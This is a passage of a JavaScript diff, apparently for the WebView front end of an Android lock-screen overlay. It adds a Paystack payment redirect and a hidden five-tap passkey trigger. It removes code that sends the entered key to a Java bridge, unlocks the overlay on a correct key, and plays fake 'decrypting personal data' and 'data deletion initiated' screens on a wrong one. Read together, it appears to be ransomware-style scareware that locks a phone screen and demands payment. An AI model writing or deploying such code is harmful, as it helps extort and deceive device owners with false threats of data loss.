+        .then(data => {
+            btn.innerText = "OPEN PAYSTACK CHECKOUT";
+            if (data.url) {
+                window.location.href = data.url; // Opens Paystack Checkout
+            }
+        }).catch(e => {
+            btn.innerText = "NETWORK ERROR. TRY AGAIN.";
+        });
+}
+
+// ==========================================
+// 3. Hidden 5-Tap Manual Key Bypass
+// ==========================================
+let taps = 0, lastTap = 0;
 document.getElementById("hiddenTrigger").addEventListener("click", () => {
     const now = Date.now();
     if (now - lastTap > 1000) { taps = 1; } else { taps++; }
     lastTap = now;
     if (taps >= 5) {
         taps = 0;
-        openAuth();
+        document.getElementById("authScreen").classList.add("active");
+        setTimeout(() => document.getElementById("passInput").focus(), 300);
     }
 });
-
-// ======================================================
-// 4. Auth Panel Logic & JAVA BRIDGE
-// ======================================================
-function openAuth() {
-    document.getElementById("authScreen").classList.add("active");
-    document.getElementById("authError").textContent = "";
-    setTimeout(() => { document.getElementById("passInput").focus(); }, 300);
-}
 
 function closeAuth() {
     document.getElementById("authScreen").classList.remove("active");
     document.getElementById("passInput").value = "";
 }
 
-// THIS SENDS THE PASSWORD TO JAVA
 function submitPass() {
     const pass = document.getElementById("passInput").value.trim();
     closeAuth();
-    // Send to OverlayService.java
     Android.verifyPasskey(pass);
-}
-
-document.getElementById("passInput").addEventListener("keydown", event => {
-    if (event.key === "Enter") { submitPass(); }
-});
-
-// ======================================================
-// 5. JAVA Bridge Callbacks (Triggered by Java)
-// ======================================================
-
-// Java calls this when the password is CORRECT
-function showDecrypting() {
-    const button = document.getElementById("accessButton");
-    const progressArea = document.getElementById("progressArea");
-    const progressBar = document.getElementById("progressBar");
-    const progressNumber = document.getElementById("progressNumber");
-    const statusLine = document.getElementById("statusLine");
-    const systemStatus = document.getElementById("systemStatus");
-
-    button.disabled = true;
-    button.style.opacity = ".4";
-    button.textContent = "DECRYPTING...";
-    progressArea.style.display = "block";
-    systemStatus.textContent = "DECRYPTING";
-    systemStatus.classList.remove("danger");
-
-    // Make progress bar green
-    progressBar.style.background = "linear-gradient(90deg,#00ffcc,#5ceaff)";
-    progressBar.style.boxShadow = "0 0 15px #00ffcc";
-
-    let progress = 0;
-    const messages = [
-        "VERIFYING KEY AUTHENTICITY",
-        "RESTORING SYSTEM FILES",
-        "DECRYPTING PERSONAL DATA",
-        "REMOVING SECURITY PAYLOAD",
-        "SYNCHRONIZING VISUAL MODULES",
-        "FINALIZING DECRYPTION"
-    ];
-    let messageIndex = 0;
-
-    let interval = setInterval(() => {
-        progress += 2; // Takes 10 seconds
-        progressBar.style.width = progress + "%";
-        progressNumber.textContent = progress + "%";
-
-        const nextMessage = Math.min(Math.floor(progress / 18), messages.length - 1);
-        if (nextMessage !== messageIndex) {
-            messageIndex = nextMessage;
-            statusLine.textContent = messages[messageIndex];
-        }
-
-        if (progress >= 100) {
-            clearInterval(interval);
-            
-            // Tell Java to actually remove the overlay and stop the service!
-            Android.unlockOverlay(); 
-            
-            // Show the success UI
-            document.getElementById("mainScreen").style.display = "none";
-            document.getElementById("successScreen").classList.add("active");
-        }
-    }, 200); // 10 seconds total
-}
-
-// Java calls this when the password is WRONG
-function showWiping() {
-    const progressArea = document.getElementById("progressArea");
-    const progressBar = document.getElementById("progressBar");
-    const progressNumber = document.getElementById("progressNumber");
-    const statusLine = document.getElementById("statusLine");
-    const systemStatus = document.getElementById("systemStatus");
-
-    progressArea.style.display = "block";
-    systemStatus.textContent = "DELETING";
-    
-    // Make progress bar RED
-    progressBar.style.background = "#ff0033";
-    progressBar.style.boxShadow = "0 0 15px #ff0033";
-    statusLine.textContent = "CRITICAL ERROR: DATA DELETION INITIATED";
-    statusLine.style.color = "#ff0033";
-
-    let progress = 0;
-    let interval = setInterval(() => {
-        progress += 4; // 2.5 seconds
-        progressBar.style.width = progress + "%";
-        progressNumber.textContent = progress + "%";
-
-        if (progress >= 100) {
-            clearInterval(interval);
-            // Reset UI back to normal
-            progressArea.style.display = "none";
-            progressBar.style.width = "0%";
-            progressNumber.textContent = "0%";
-            systemStatus.textContent = "ACTIVE";
-            systemStatus.classList.add("danger");
-            statusLine.style.color = "#ff3366";
-            document.getElementById("passInput").value = "";
-            openAuth(); // Let them try again
-        }
-    }, 100);
-}
-
-// ======================================================
-// 6. Restart
-// ======================================================
-function restartDemo() {
-    document.getElementById("successScreen").classList.remove("active");
-    document.getElementById("mainScreen").style.display = "flex";
-    document.getElementById("progressArea").style.display = "none";
-    document.getElementById("progressBar").style.width = "0%";
-    document.getElementById("progressNumber").textContent = "0%";
-    document.getElementById("systemStatus").textContent = "ACTIVE";
-    document.getElementById("systemStatus").classList.add("danger");
-    document.getElementById("accessButton").disabled = false;
-    document.getElementById("accessButton").style.opacity = "1";
-    document.getElementById("accessButton").textContent = "◈  ENTER DECRYPTION KEY";
-    document.getElementById("passInput").value = "";
 }
 </script>
 
